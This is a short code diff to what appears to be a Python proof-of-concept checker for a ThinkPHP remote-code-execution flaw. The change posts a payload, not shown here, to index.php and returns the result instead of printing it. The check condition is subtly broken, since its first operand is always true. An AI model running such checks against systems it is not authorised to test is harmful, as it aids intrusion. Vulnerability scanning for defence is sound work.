@@ -25,6 +25,7 @@ def thinkphp_construct_debug_rce_verify(url):
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php')
+        print(vurl)
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
         if r"string(32)" and r"56540676a129760a3ea" in req.text:
             pocdict['isvul'] = True
@@ -32,7 +33,6 @@ def thinkphp_construct_debug_rce_verify(url):
             pocdict['payload'] = payload
             pocdict['proof'] = '56540676a129760a3'
             pocdict['response'] = req.text
-            print(pocdict)
-
+            return pocdict
     except:
         pass
